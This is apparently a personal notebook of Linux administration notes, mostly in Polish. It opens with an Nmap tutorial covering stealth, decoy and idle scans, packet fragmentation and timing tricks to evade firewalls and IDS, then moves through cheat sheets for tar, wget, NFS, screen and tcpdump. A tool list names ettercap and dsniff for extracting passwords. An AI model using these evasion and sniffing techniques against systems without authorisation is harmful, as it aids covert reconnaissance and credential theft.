Nazwanie Nmapa skanerem sieciowym nie do konca bylo by zgodne z prawda i mozna powiedziec zakwalifikowalo by go do setek skanerow sieciowych dostepnych w internecie. Tak wlasnie nie jest. Nmap jest bardzo rozbudowanym programem, ktory oferuje nam to co wszystkie osiagalne urzadzenia. Posiada mozliwosc skanowania wszystkimi metodami, ktore posiadaja inne urzadzenia. Np.: od pelnego skanowania metoda polaczenia bezposredniego poprzez szereg metod utajnionych, az po skanowanie odbijane ( skanowanie serverow FTP ), identyfikacje systemu operacyjnego na podstawie odcisku stosu oraz bardzo dokladna przydatna administratorom funkcje identyfikacji uruchomionych w danym momencie uslog. Warto rowniez dodac, iz Nmap pracuje zarowno w konsoli jak i dostepna po kompilacji jest wersja graficzna, ktora obsluguje sie spod X'ow. Zeby dokladnie przyblizyc Wam dzialanie Network Mapper' a przedstawie i opisze ponizej dostepne funkcje w Nmapie.


Dostepne typu skanow:


-sT - TCP connect() port scan; opcja osiagalna z kazdego poziomu, nie tylko roota, ale z kazdego zalogowanego usera. Jest to pelne skanowanie polaczeniowe TCP. Jest to opcja ustawiona domyslnie w Nmapie.


-sS - SYN stealth port scan czyli utajnione, polotwarte skanowanie portow ze wzgledu na to iz nie otwieramy pelnego polaczenia TCP. Najczesciej wykorzystywana przeze mnie metoda skanowania. Jednakze moze zdazyc sie, iz niektore zapory ogniowe moga blokowac skanowanie SYN stealth dlatego ponizej opisane kolejne metody moga przyniesc rowniez oczekiwany skutek.


-sU - UDP port scan; skaner wysyla pakiety UDP o wilkosci 0 bajtow do portow ICMP i jezeli nie dostaje odpowiedzi oznacza to ze interesujacy go port jest zamkniety.


-sP - ping scan; przydatna metoda najczesciej jesli chcemy wiedziec czy dane maszyny o interesujacych nas numerach IP odpowiadaja w sieci. Standardowa metoda jak zwykle pingowanie. Nmap wysla pakiet ICMP z prosba o odpowiedz. Jednakze duza wiekszosc maszyn moze miec mozliwosc nie zwracania pakietu wiec najlepiej wylaczyc ( -P0 ) ta metode skanowania, poniewaz z poziomu roota jest ta technika wlaczona domyslnie.


-sF, -sX, -sN - Wspomniane wyzej metody skanowania, ktore moga byc skuteczne jesli zawiedzie nas metoda SYN scan.


1) FIN scan; Nmap wysyla czysty pakiet FIN do interesujacego go portu i jesli w odpowiedzi otrzymuje RST oznacza to iz dany port jest zamkniety, jesli nie otrzymuje zadnej odpowiedzi znaczy, ze skanowany port jest otwarty.


2) Xmas Tree scan wykozystuje pakiet z flagami FIN, PUSH i URG.


3) Null scan jest bardzo podobny do skanowania FIN jednakze w tym wypadku wszystkie flagi pozostaja zamkniete.


Jesli chodzi o wymienione powyzej 3 metody skanowania nie maja one racji bytu w momencie prob skanowania serverow opartych na systemach firmy Microsoft ;] po prostu nie dzialaja, gdyz system Windows :)) nie rozumie tej specyfikacji IP.


-sR - RPC scan, metoda skanowania uslog RPC ktora moze byc uzyta w polaczeniu z kazdym innym skanowaniem. Podczas normalnego skanowania wysylane jest zapytanie do okreslonego portu, a w raz z wlaczona opcja -sR kolejne zapytanie czy na tym porcie uruchomiona jest usloga RPC i jesli tak jest jaki obsluguje protokol.


-sO - IP protocol scans, skanowanie protokolow IP. Do interesujacego nas servera wysylane jest przez Nmap zapytanie jakie protokoly obsluguje dany komputer. Jesli na przyklad otrzymamy komunikat, ze protkol ICMP jest niedostepny, to znaczy ze nie jest przez dany komputer obslugiwany.


-sA - ACK scan; ten rodzaj zaawansowanego skanowania mozna uzyc do mapowania zestawow regol uzytych w firewallach. Mozemy sie na przyklad dowiedziec czy firewall jest skomplikowana osobna zapora czy tylko prostym filtrem blokujacym. Metoda ta wysyla pakiet ACK do odpowiednich portow i w momencie otrzymania odpowiedzi RST port zastaje zaklasyfikowany jako niefiltrowany. Natomiast jesli nie otrzymujemy odpowiedzi lub odpowiedz, ze ICMP jest niedostepny oznacza to ze port zostal zaklasyfikowany jako port filtrowany.


-sW - Window scan; metoda bardzo podobna do ACK scan, wykorzystuje rozmiar okna TCP do okreslenia czy dane porty sa filtrowane czy nie sa. Ponizej przedstawiam systemy na ktorych z powodzeniem mozemy zastosowac ta technike:

AIX, Amiga, BeOS, BSDI, Cray, Tru64 UNIX, DG/UX, OpenVMS, Digital UNIX, FreeBSD, HP-UX, OS/2, IRIX, MacOS, NetBSD, OpenBSD, OpenStep, QNX, Rhapsody, SunOS 4.X, Ultrix, VAX, oraz VxWorks.


-sL- List scan; metoda ta po prostu generuje nam i wylistowuje adresy IP ale bez skanowania portow oraz pingowania. Natomiast okreslanie DNS jest wlaczone, chyba ze my sami je wylaczymy.


-sI - Idlescan; zaawansowana metoda slepego skanowania portow. Oznacza to, ze praktycznie zadne pakiety TCP podczas skanowania nie sa wysylane z adresu, z ktorego rzeczywiscie przebiega skanowanie. Co to oznacza w rzeczywistosci: skanowany IDS bedzie wyswietlal wstawiony przez nas adres IP podczas skanowania , a nie adres naszej maszyny. Jesli chodzi o ta metode skanowania polecam dokladne zapoznanie sie ze srronami man nmap' a oraz przeprowadzenie kilku testow aby dokladnie zglebic tajniki tej metody.


-b - FTP bounce attack; metoda skanowania portow docelowego komputera, poprzez inny komputer z uruchomiona usloga FTP. Nmap moze wykorzystac skanowanie docelowego komputera poprzez jeszcze inna maszyne z serverem FTP, wykorzystuje w do tego polecenie PORT oraz dla podtrzymania polaczenia ( gdyz jak wiadomo w serverach FTP ) muszi byc wykorzystane przesylanie danych, polecenie LIST.

Dostepne dodatkowe opcje ( przytocze tu tylko czesciej wykorzystywane opcje, gdyz moim celem nie jest tlumaczenie stron man nmap' a, a przyblizenie jak to urzadzenie funkcjonuje i jak bardzo jest przydatne ) :


-P0 - flaga, ktora mozemy nadac jesli dany host blokuje pakiety ICMP, Nmap zwykle przed rozpoczeciem skanowania wykonuje pingowanie interesujacej nas maszyny.


-PS - ta opcja uzywa zapytania pakietow SYN zamiast pakietow ACK, opcja dla uzytkownikow z uprawnieniami root. Hosty funkcjonujace powinny dac odpowiedz RST. Jest mozliwosc wybrania ospowiedniego portu, np.: -PS21


-O - bardzo ciekawa opcja Nmapa polegajaca na identyfikacji systemu operacyjnego docelowego komputera. Metoda polega na idenkacji OS' a za pomoca chyba najbardziej dokladnej i zaawansowanej metody mianowicie odcisku aktywnego stosu. Nmap wykorzystuje specjalnie spreparowane pakiety, a odpowiedzi z komputera porownane z baza odciskow identyfikuja system operacyjny na interesujacym nas komputerze. Jednakze moze zdazyc sie tak, ze Nmap nie jest w stanie okreslic systemu operacyjnego, a my wiemy jaki system operacyjny jest na skanowanym komputerze. Otrzymujemy wteduy instrukcje jak postepowac z niesklasyfikowanym odciskiem, wraz ze strona www, na ktorej wpisujemy dany OS wklejamy odcisk, a bedzie on uwzgledniony w pozniejszej wersji Nmapa.


-I - metoda odwroconego skanowania, uzywa pelnego polaczenia connect, laczy sie z danym portem i nasluchuje jaki server z uprawnieniami root ma polaczenie z internetem.


-f - kolejna ciekawa opcja skanowania podzielonymi pakietami TCP na bardzo male czesci. Umozliwia to na przyklad dotarcie poprzez zapory ogniowe do interesujacego nas servera. Zapora ogniowa nie potrafi poskladac pakietow i dlatego jest w stanie przepuscic podzielone pakiety, ktore nastepnie zostana zlozone przez interesujacy nas komputer, a co za tym idzie skanowanie moze przeslizgnac sie przez zapoty ogniowe i odniesc zamierzony skutek.


-F - flaga szybkiego skanowania, jak wiadomo okreslone uslogi maja przyporzadkowane odpowiednie porty, po podaniu Nmapowi tej opcji Nmap przeprowadzi skanowanie tylko najwazniejszych portow, co oczywiscie jest znacznie szybsze niz skanowanie wszystkich 65535 portow.


-p - opcja skanowania wybranych portow np: 1-80


-v opisowa metoda przedstawienia danych, jednakze polecam uzycie podwojnej opcji czyli -vv, aby otrzymac o wiele oabrziej dokladne dane.


-D - opcja podszywania sie pod podane hosty, hosty moga byc wprowadzone zarowno recznie jak i korzystac z calej listy hostow, np.: tej samej, ktorej uzywamy do skanowania.


-T - ograniczenie czasowe skanowania. Niektore IDS' y maja mozliwosci wykrywania ( nasluchiwania ) nieodpowiednich czyli w naszym przypadkow spreparowanych pakierow IP w okreslonym czasie, co w koncowym efekcie doprowadzi do przerwania skanowania uzycie tej funkcji i oszukanie IDS' ow moze byc skuteczne i przyniesc nam oczekiwany efekt.


-oN - logowanie do pliku.


Ponizej dla zapoznania sie z dzialaniem Nmapa przedstawiam przyklad skanowania komputera podlaczonego do internetu. Numer IP oraz host zostaly wykasowane.

# nmap (V. 2.54BETA32) scan initiated Mon Apr 8 09:00:39 2002 as: nmap -sS -sR -f -F -vv -P0 -O -R -oN my-victim numer_ip


-------------------
aptitude install nmapfe - grafinczna nakładna na npmap
nmap - how to scan hosts of networks for open ports
sudo nmap -sS -O 127.0.0.1

-sS
    TCP SYN scan
-O
    Enable Operating System detection

sudo nmap -sU 127.0.0.1

-sU
    UDP ports scan

sudo nmap -sS -O -p 20-25 127.0.0.1

-sS
    TCP SYN scan
-p 20-25
    Scan on ports 20 to 25

sudo nmap -sS -F 127.0.0.1

-sS
    TCP SYN scan
-F
    Fast (limited port) scan 

--------------------
gento

----
Linux command: What is my IP? (Public IP address)

Using wget

wget -q -O - checkip.dyndns.org|sed -e 's/.*Current IP Address: //' -e 's/<.*$//'

Using curl

curl -s checkip.dyndns.org|sed -e 's/.*Current IP Address: //' -e 's/<.*$//'

curl -s http://whatismyip.org/

Using Lynx

lynx -dump checkip.dyndns.org


---------------

tasksel --list-tasks
------------------
How to download files from cellular using Bluetooth
apt-get install obexftp bluetooth
hcitool scan
sdptool browse 00:16:20:60:7C:36
Browse your cellular's files
obexftp -b 00:16:20:60:7C:36 -c / -l
Download files

obexftp -b 00:16:20:60:7C:36 -c /Pictures -g picture1.jpg
Upload Files

obexftp -b 00:16:20:60:7C:36 -c /Pictures -p file.jpg

---------------------------
wget

wget http://www.site.com/file.pdf

But if there is the need to download the entire site, use the recursive option.

wget -r http://www.site.com

Now what to do if only certain file types are needed?
Use the -A option

To download only pdf and jpg use.

wget -r -A pdf,jpg http://www.site.com

Well now suppose that there is the need to follow external links, usually wget does not do this, here we can use -H option.

wget -r -H -A pdf,jpg http://www.site.com

This is a little bit dangerous as it could end up downloading a lot much files that the ones needed, so we could limit the sites to follow, we will use -D for this.

wget -r -H -A pdf,jpg -Dfiles.site.com http://www.site.com

By default wget will follow 5 levels when using -r option, we can change this behaviour with the -l option.

wget -r -l 2 http://www.site.com

------------------------

clusterssh

---------------
NFS — Network File System, czyli pingwiny sobie rozmawiają

Instalacja i konfiguracja za pomocą konsoli

Po pierwsze musimy zainstalować serwer NFS, który będzie zajmował się udostępnianiem danych między komputerami. W Debianie i pochodnych robimy to w następujący sposób:

sudo apt-get install nfs-kernel-server nfs-common portmap

W innych dystrybucjach korzystamy z odpowiedniego menedżera pakietów, aby zainstalować NFS i portmap. Teraz powinniśmy wyedytować plik /etc/exports - ja skorzystam z konsolowego edytora nano:

sudo nano /etc/exports

Do otwartego dokumentu powinniśmy wpisać np.:

/home/pub 192.168.0.4(rw)

Może nieco przybliżę składnię w tym pliku.
/home/pub - To folder, którego zawartość chcemy udostępnić.
192.168.0.4 - Tutaj podajemy adres IP komputera, który powinien mieć dostęp do naszego udostępnianego katalogu.
(rw) - rw jest skrótem od read/write, więc komputer, któremu udostępniamy zasób może dokonywać w nim zmian. Jeśli sobie tego nie życzymy, możemy zastosować atrybut tylko do odczytu - (ro).

Zapisujemy zawartość i wykonujemy operacje:

sudo /etc/init.d/nfs-kernel-server restart
sudo /etc/init.d/portmap restart
sudo exportfs -a

Te polecenia restartują serwer NFS i pobierają konfigurację umieszczoną w /etc/exports.

Serwer jest już gotowy, warto więc zająć się konfiguracją komputera, któremu chcemy udostępnić dane. Instalujemy na nim klienta NFS poprzez:

sudo apt-get install nfs-common portmap

Należy teraz stworzyć folder, do którego zamontujemy nasz zasób:

sudo mkdir /mnt/pub

Na koniec pozostaje już tylko zamontować udostępniony folder:

sudo mount -t nfs 192.168.0.2:/home/pub /mnt/pub

192.168.0.2 to oczywiście adres serwera udostępniającego pliki.

Jeżeli już nie potrzebujemy naszego zasobu, wpisujemy polecenie:

sudo umount /mnt/pub


Automatyczne montowanie

Od dawna wiadomo, że człowiek jest istotą leniwą i nie chce mu się za każdym razem wpisywać tych samych komend, aby montować zasób. Warto więc sprawić, aby zajął się tym system.

W tym celu należy otworzyć plik /etc/fstab

sudo nano /etc/fstab

a następnie dopisać do niego linijkę:

192.168.0.2:/home/pub  /mnt/pub   nfs      rw,hard,intr  0     0

Myślę, że warto objaśnić dwie opcje: hard oraz intr. Pierwsza z nich odpowiada za zawieszenie dostępu do danych, gdy serwer ulegnie awarii, natomiast druga umożliwia zabicie zawieszonego procesu poprzez komendę kill.

---------------------------

nm-applet &

--------------------------------

Wstrzymanie (zapis plików w pamięci RAM i wyłączenie dysku):

    pmi action suspend

Hibernacja (zapis plików na dysk twardy i wyłączenie komputera):

    pmi action hibernate

Blokowanie komputera (blokada aktualnej sesji GNOME):

    gnome-screensaver-command --lock

-----------------------------

----------------------------------

Running kernel and system information

# uname -a                           # Get the kernel version (and BSD version)
# lsb_release -a                     # Full release info of any LSB distribution
# cat /etc/SuSE-release              # Get SuSE version
# cat /etc/debian_version            # Get Debian version

Use /etc/DISTR-release with DISTR= lsb (Ubuntu), redhat, gentoo, mandrake, sun (Solaris), and so on. See also /etc/issue.

# uptime                             # Show how long the system has been running + load
# hostname                           # system's host name
# hostname -i                        # Display the IP address of the host. (Linux only)
# man hier                           # Description of the file system hierarchy
# last reboot                        # Show system reboot history

Kernel detected hardware

# dmesg                              # Detected hardware and boot messages
# lsdev                              # information about installed hardware
# dd if=/dev/mem bs=1k skip=768 count=256 2>/dev/null | strings -n 8 # Read BIOS


Linux

# cat /proc/cpuinfo                  # CPU model
# cat /proc/meminfo                  # Hardware memory
# grep MemTotal /proc/meminfo        # Display the physical memory
# watch -n1 'cat /proc/interrupts'   # Watch changeable interrupts continuously
# free -m                            # Used and free memory (-m for MB)
# cat /proc/devices                  # Configured devices
# lspci -tv                          # Show PCI devices
# lsusb -tv                          # Show USB devices
# lshal                              # Show a list of all devices with their properties
# dmidecode                          # Show DMI/SMBIOS: hw info from the BIOS


Load, statistics and messages

The following commands are useful to find out what is going on on the system.

# top                                # display and update the top cpu processes
# mpstat 1                           # display processors related statistics
# vmstat 2                           # display virtual memory statistics
# iostat 2                           # display I/O statistics (2 s intervals)
# systat -vmstat 1                   # BSD summary of system statistics (1 s intervals)
# systat -tcp 1                      # BSD tcp connections (try also -ip)
# systat -netstat 1                  # BSD active network connections
# systat -ifstat 1                   # BSD network traffic through active interfaces
# systat -iostat 1                   # BSD CPU and and disk throughput
# tail -n 500 /var/log/messages      # Last 500 kernel/syslog messages
# tail /var/log/warn                 # System warnings messages see syslog.conf


Users

# id                                 # Show the active user id with login and group
# last                               # Show last logins on the system
# who                                # Show who is logged on the system
# groupadd admin                     # Add group "admin" and user colin (Linux/Solaris)
# useradd -c "Colin Barschel" -g admin -m colin
# usermod -a -G <group> <user>       # Add existing user to group (Debian)
# groupmod -A <user> <group>         # Add existing user to group (SuSE)
# userdel colin                      # Delete user colin (Linux/Solaris)
# adduser joe                        # FreeBSD add user joe (interactive)
# rmuser joe                         # FreeBSD delete user joe (interactive)
# pw groupadd admin                  # Use pw on FreeBSD
# pw groupmod admin -m newmember     # Add a new member to a group
# pw useradd colin -c "Colin Barschel" -g admin -m -s /bin/tcsh 
# pw userdel colin; pw groupdel admin


Linux

Per shell/script

The shell limits are governed by ulimit. The status is checked
with ulimit -a. For example to change the open files limit from
1024 to 10240 do:

# ulimit -n 10240                    # This is only valid within the shell


The ulimit command can be used in a script to change the limits for the script only.

Per user/process

Login users and applications can be configured in /etc/security/limits.conf. For example:

# cat /etc/security/limits.conf
*   hard    nproc   250              # Limit user processes
asterisk hard nofile 409600          # Limit application open files


System wide

Kernel limits are set with sysctl. Permanent limits are set in /etc/sysctl.conf.

# sysctl -a                          # View all system limits
# sysctl fs.file-max                 # View max open files limit
# sysctl fs.file-max=102400          # Change max open files limit
# echo "1024 50000" > /proc/sys/net/ipv4/ip_local_port_range  # port range
# cat /etc/sysctl.conf
fs.file-max=102400                   # Permanent entry in sysctl.conf
# cat /proc/sys/fs/file-nr           # How many file descriptors are in use

Use chkconfig to configure the programs that will be started at boot in a runlevel.

# chkconfig --list                   # List all init scripts
# chkconfig --list sshd              # Report the status of sshd
# chkconfig sshd --level 35 on       # Configure sshd for levels 3 and 5
# chkconfig sshd off                 # Disable sshd for all runlevels


Debian and Debian based distributions like Ubuntu or Knoppix use the command update-rc.d to manage the runlevels scripts. Default is to start in 2,3,4 and 5 and shutdown in 0,1 and 6.

# update-rc.d sshd defaults          # Activate sshd with the default runlevels
# update-rc.d sshd start 20 2 3 4 5 . stop 20 0 1 6 .  # With explicit arguments
# update-rc.d -f sshd remove         # Disable sshd for all runlevels
# shutdown -h now (or # poweroff)    # Shutdown and halt the system





------------------


networkmanager

nm-aplet

---------------

tar
tworzenie archiwum
tar -cvf archiwum.tar PLIKI lub tar --create --verbose --file=archiwum.tar PLIKI
(Parametr -v (--verbose) jest opcjonalny; dzięki niemu tar pokazuje, który plik jest właśnie dodawany do archiwum.
Uwaga! Jeżeli plik archiwum.tar już istnieje, zostanie zamazany bez pytania.)
wyświetlenie listy plików w archiwum
tar -tf archiwum.tar (tar -tvf archiwum.tar) lub tar --list --file=archiwum.tar (tar --list --verbose --file=archiwum.tar)
rozpakowanie archiwum archiwum.tar do katalogu /tmp
cd /tmp tar -xvf archiwum.tar lub tar --get --verbose --file=archiwum.tar lub tar --extract --verbose --file=archiwum.tar
ewentualnie
tar -xvf archiwum.tar -C /tmp lub analogicznie tar --get --verbose --file=archiwum.tar --directory=/tmp
Katalog, do którego chcemy rozpakować pliki, musi istnieć.
Uwaga: pliki są nadpisywane bez pytania.
rozpakowanie wybranych plików do katalogu /tmp
tar -xvf archiwum.tar -C /tmp PLIKI
Katalog, do którego chcemy rozpakować pliki, musi istnieć.
dołączanie plików na koniec archiwum
tar -rf archiwum.tar PLIKI lub tar --append --file=archiwum.tar PLIKI (j.w. można też z -v lub --verbose)
usuwanie pliku/plików PLIKI z archiwum
tar --delete -f archiwum.tar PLIKI lub tar --delete --file=archiwum.tar PLIKI
Poleceniem tym można usuwać całe ścieżki z archiwum. Warto zachować ostrożność.

tar + gzip
tworzenie archiwum
tar -zcvf archiwum.tar.gz PLIKI lub tar --gzip ...
rozpakowanie archiwum
tar -zxvf archiwum.tar.gz lub tar --gzip lub ... tar --gunzip ... lub tar --ungzip ...

tar + bzip2
tworzenie archiwum
tar -jcvf archiwum.tar.gz PLIKI lub tar --bzip2 ...
rozpakowanie archiwum
tar -jxvf archiwum.tar.bz2 lub tar --bzip2 ...

zip
tworzenie archiwum
zip -r archiwum.zip PLIKI
(Parametr -r jest potrzebny, gdy dodajemy również katalogi - powoduje on, że do pliku archiwum.zip trafia nie tylko dany katalog, ale również jego zawartość. Gdy podajemy tylko nazwy plików, -r można pominąć.)
Jeżeli plik archiwum.zip istnieje, PLIKI są do niego dołączane.
wyświetlenie listy plików w archiwum
unzip -l archiwum.zip
testowanie archiwum
unzip -t archiwum.zip
rozpakowanie archiwum archiwum.zip do katalogu /tmp
unzip z.zip -d /tmp
rozpakowanie archiwum archiwum.zip, przywracając oryginalne wartości UID i GID (dotyczy systemów UNIX i pochodnych)
unzip -X archiwum.zip
Inaczej niż w przypadku programu tar: jeśli katalog, do którego chcemy rozpakować archiwum nie istanieje, zostanie on utworzony.
rozpakowanie wybranych plików do katalogu /tmp
unzip archiwum.zip -d /tmp PLIKI
dołączanie plików do archiwum
zip -r archiwum.zip PLIKI
usuwanie pliku/plików PLIKI z archiwum
zip -d archiwum.zip PLIKI

gzip
kompresowanie pliku
Uwaga. Program gzip nie archiwizuje plików - plik .gz może przechować tylko 1 plik (w postaci skompresowanej).
gzip PLIK (uwaga: PLIK zostanie usunięty)
To polecenie tworzy plik o nazwie PLIK.gz, a następnie usuwa PLIK.
kompresowanie pliku - sposób drugi (bez usuwania pliku wejściowego)
gzip -c PLIK > nowyplik.gz
Uwaga. Jeżeli nowyplik.gz istnieje, zostanie nadpisany bez pytania.
testowanie pliku
gzip -tv plik.gz
wyświetlenie informacji o pliku .gz
gunzip -l plik.gz lub gunzip -lN plik.gz
(Szczypta "teorii". Gdy program gunzip dekompresuje plik, domyślnie nadaje nowemu taką samą nazwę, ale bez rozszerzenia .gz. Jeśli dodamy parametr -N, utworzony plik będzie miał nazwę taką, jaką miał przed kompresją.
Stąd parametr -N ma znaczenie także przy wyświetlaniu informacji o pliku gzip w polu uncompressed_name - nazwa pliku po dekompresji.)
rozpakowanie pliku plik.gz do katalogu /tmp
cd /tmp gunzip plik.gz lub gunzip -N plik.gz
rozpakowanie pliku nowyplik.gz do katalogu /tmp - sposób drugi
gunzip -c plik.gz > /tmp/mój_plik
Uwaga. Jeżeli mój_plik istnieje, zostanie nadpisany bez pytania.

bzip2
kompresowanie pliku
Uwaga. Program bzip2 nie archiwizuje plików - plik .bz2 może przechować tylko 1 plik (w postaci skompresowanej).
bzip2 PLIK (uwaga: PLIK zostanie usunięty)
To polecenie tworzy plik o nazwie PLIK.bz2, a następnie usuwa PLIK.
kompresowanie pliku - sposób drugi (bez usuwania pliku wejściowego)
bzip2 -k PLIK
testowanie pliku
bunzip2 -tv plik.bz2
(Podobnie jak w przypadku gzipa, po dekompresji program bzip2 domyślnie nadaje nowemu plikowi taką samą nazwę, ale bez rozszerzenia .bz2.
Tutaj jednak nie występuje parametr o funkcji takiej, jaką ma -N z gzipa.)
rozpakowanie pliku plik.bz2 do katalogu /tmp
cd /tmp bunzip2 plik.bz2
Jeśli plik.bz2 nie ma być usunięty, stosujemy parametr -k.
rozpakowanie pliku nowyplik.gz do katalogu /tmp - sposób drugi
bunzip2 -c plik.bz2 > /tmp/mój_plik
Uwagi. W tym przypadku plik.bz2 nie zostanie usunięty. Natomiast, jeżeli mój_plik istnieje, zostanie nadpisany bez pytania.
Porada. Masz zepsuty plik bz2? Spróbuj go naprawić za pomocą polecenia bzip2recover! Może chociaż część pliku da się uratować...

7-zip
7-zip jest uniwersalnym programem kompresującym. Obsługuje kilka formatów kompresji, ma również swój - 7z, wykorzystujący domyślnie algorytm LZMA, który jest stosowany w niektórych paczkach deb.
Największą wadą formatu 7z jest to, że nie zapisuje "uniksowych" informacji o właścicielu i grupie plików. Stąd niezalecane jest używanie archiwum 7z do przechowywania kopii zapasowych w Linuksie. Zamiast tego warto utworzyć plik tar z wybranymi plikami, a dopiero potem skompresować w formacie 7z.
Co więcej, również pliki w innych formatach (zip, tar) utworzone za pomocą 7z nie mają ustawionych wartości UID/GID.
tworzenie archiwum
7z a archiwum.7z PLIKI
wyświetlenie listy plików w archiwum
7z l archiwum.7z
testowanie
7z t archiwum.7z
rozpakowanie archiwum archiwum.7z do katalogu /tmp
7z x archiwum.7z -o/tmp
Po parametrze -o nie ma być odstępu.
rozpakowanie wybranych plików do katalogu /tmp
7z x archiwum.7z -o/tmp PLIKI
dołączanie plików do archiwum
7z a archiwum.7z PLIKI
usuwanie pliku/plików PLIKI z archiwum
7z d archiwum.7z PLIKI

----------
vnstat -h

---------

nmon - ibm monitorint


-----------------


Następnie nadajemy prawa wykonywalności dla plików: 
chmod ugo+x nmon*. 
Wygodnie jest uruchamiać program za pomocą krótkiego polecenia nmon wydanego z dowolnego miejsca, w tym celu wydajemy polecenie: 
ln -s /opt/nmon/nmon_x86_knoppix5 /usr/local/bin/nmon.

---------------------------

odzyskiwanie danych 
pc inspector recovery

niszczenie plików
shred

linux
testdisk
magic rescue

sleudkid
de sloudkid 

teel task
 autopsy

de sloudkid 
tel task

teel task

gpard

kaskowanie danych
shed
wite

----
{lista po³¹czeñ} 
grep -v udp /proc/net/ip_conntrack|cut -c 12-|cut -d" " -f 2,3,4,5,6|sort -k 2,5

( linux screen )
Przydatna konsola szczególnie przy upgradzie systemu lub innych czynnociach gdzie nie chcielibymy aby zerwa³o bie¿¹c¹ sesjê ssh, bez wdawania siê w szczegó³y

1) install screen
2) odpalamy poleceniem screen 
3) znajdujemy siê w wirtulanej konsoli gdzie u¿ywamy klawiszy:

"ctrl" + "a" nastêpnie "c"	#tworzy nowe okno
"ctrl" + "a" nastêpnie "n"	#prze³¹cza do nastêpnego okna
"ctrl" + "a" nastêpnie "p"	#prze³¹cza do poprzedniego okna
"ctrl" + "a" nastêpnie "i"	#informacja o oknie

4) je¿eli zerwa³o sesjê wejd ponownie i wpisz:
screen -x

5) zrywaj sesjê poleceniem:
"ctrl" + "a" nastêpnie "d"

6) powracaj do niej:
screen [-d] -r [pid.]tty.host

{lista komend}
tail -f [plik]					#pokazuje na bie¿¹co zawartoæ pliku od jego koñca
ctrl + C, fg [nr jobs], jobs	#obs³uga procesów bed¹cych w tle
iptables -L -t nat -v|drop		#lista wszystkich regu³ z ³añcucha nat za wyj¹tkiem drop
iptables -m [cel] --help		#opis celu
sort -u										#sortuje i wypisuje tylko niepowtarzaj¹ce siê rekordy
ctrl z										#pauza do programu
bg [program]								#wrzucenie programu do background
jobs										#wywietlenie numerów zadañ w tle
fg [nr z jobs]								#przywrócenie zadania z powrotem
find / -perm +4000							#szukanie setuid
find -perm -002 -mtime,-atime,-ctime -n,+n	#pliki z co najmniej prawem zapisu i -mtime modyfikowane,-atime do ktorych sie dostano,-ctime 
#którym zmieniono uprawnienia,-n w ciagu n dni,+n dawniej niz n dni temu
find / -name plik -exec /bin/polecenie {} \;
#wykonanie na znalezionym pliku /bin/polecenie
lspci				#listuje urz¹dzenia dla pci podobnie lsusb
date[opcje], hwclock --systohc	#konfiguracja daty
strobe				#skanowanie
scripts				#wyci¹ganie tekstu z binarek
file [plik]			#pokazanie rodzaju pliku
md5sum -b [plik]		#suma md5 z pliku
lsmod				#lista modu³ów
strings [plik]			#wypisanie np. z pliku w C ciagów znaków
uniq -d				#wypisuje tylko linie powtarzajace sie
strace [polecenie] 2> [plik]	#zapis w pliku inf o wykonywanych przez polecenie instrukcji
strace -f -e open [polecenie]	#jw tyko -f procesy potomne, -e open otwierane pliki
echo "$((`date -d '10 mar' +%s`-`date +%s`))/86400"|bc
#obliczanie dni pomiêdzy okrelonymi datami
zcat /usr/src/2.4.32-libata1.patch.gz | patch -p1 
#patchowanie j¹dra - bed¹c w katalogu ze ródlami
logger [tekst]			#wpis do logów dowolnego tekstu
sed -e's/a//g'			#edytor liniowy
shc -f				#kompilacja plików w bashu
expect				#automatyczne wykonywanie programów
which [polecenie]		#do jakiej cie¿ki odnosi sie polecenie
locate [plik]			#proste wyszukiwanie pliku
man -k [slowo],apropos [slowo]	#wyszukiwanie manuali w których wystêpuje [slowo]
/proc/sys/kernel/printk		#ustawienia dotyczace komunikatow
mbmon				#odczyty z czujnikow na plycie glownej
ab				#testowanie serwera Apache
mii-tools			#testowanie linkow
tcpdump -D			#wypisuje wszystkie interfejsy
tcpdump 'tcp[tcpflags] & {tcp-syn) !=0'	
#nas³uch pakietow SYN
tcpdump -nv dst  and 'icmp[icmptype] = icmp=echo'
#nas³uch tylko icmp-echo
hdparm -it /dev/hda		#testowanie prêdkoci dysku
iperf -s,iperf -c [IP servera]	#testowanie prêdkoci ³¹cza komendy odpowiednio dla serwera i dla klienta
ethtool				#zestawienie kart sieciowych
type [program]			#pokazuje cie¿kê do programu
cfdisk /dev/hda1		#do kasowania i tworzenia partycji
mkfs  -t xfs -f /dev/hda1	#do formatowania partycji
man [polecenie]| col -b >[plik]	#zamiana mana na plik tekstowy
ldd [polecenie]			#pokazuje z jakich bibliotek korzysta polecenie
dpkg --get-selections "*"	#wywietla listê zainstalowanych pakietów
watch				#powtarzanie polecen z wyswietlaniem wyniku na konsole


( linux aplikacje )

nmap				#skaner
tcpump				#do nasluchiwania
hping3, sendip			#wysylanie dowolnych pakietow
iptraf,nload,iftop,ipfm		#wykorzystanie lacza
netcat				#zamiast telneta
p3scan				#transparent pop3-proxy
hdparm				#testowanie hdd
ettercap,dsniff			#do wyciagania hasel
mondo,mindi			#programy do backupu i do bootu
modconf				#manager modulow
mbmon				#odczyty z czujnikow na plycie glownej
minicom				#obsluga portu szeregowego
ntop				#monitorowanie sieci


dmesg|grep hd


( linux backup )
Aby zrobiæ backup serwera z dok³adnym odbiciem partycji etc. wykorzystujemy do tego pakiet mondoarchive: apt-get install mondoarchive
Nastêpnie tworzymy katalog np.:/backup i wpisujemy

mondoarchive -Oi -E /backup -d /backup/


{skrypty}
Np.: Mamy pliczek: test testowanego testu.txt a chcemy mieæ test_testowanego_testu.txt

ls | while read plik ; do mv "$plik" `echo $plik|tr ' ' '_'` ; done

NP.:Jak wywietliæ zawartoæ pliku bez spacji i pustych lini.....

cat nazwa_pliku |grep -E -v "^#|^$"

NP.:Uruchamianie programu jesli nie jest uruchomiony

if [ -z `pgrep -n mpd` ]
then
mpd
fi

Najlepiej dodac? do .bashrc

NP.: Jak zmieniæ hurtem du¿¹ iloæ nazw plików
Mamy np. pliki cos.txt plik.avi 12qasw.doc itd. a chcemy mieæ 01.txt 02.avi 03.doc itd.
a=1;for x in *;do echo mv "$x" `printf %02d $a`.`echo $x|cut -f 2 -d "."`;a=$[a+1];done

NP.:Wyszukiwanie danego s³owa w du¿ej iloci plików

W jaki sposób szybko znaleæ w którym z plików z danego katalogu znajduje siê szukany wyraz?

Prosty sposób, aby pozbyæ siê z pliku wszystkich zakomentowanych linijek
grep -v ^# plik > plik_bez_komentarzy

-------------
1. Logowanie siê na konsolê screena.
Aby pod³¹czyæ siê do sesji screena loguj¹c siê przez ssh wystarczy wykonaæ polecenie:
ssh -t user@host "su -c 'screen -d -RR'"

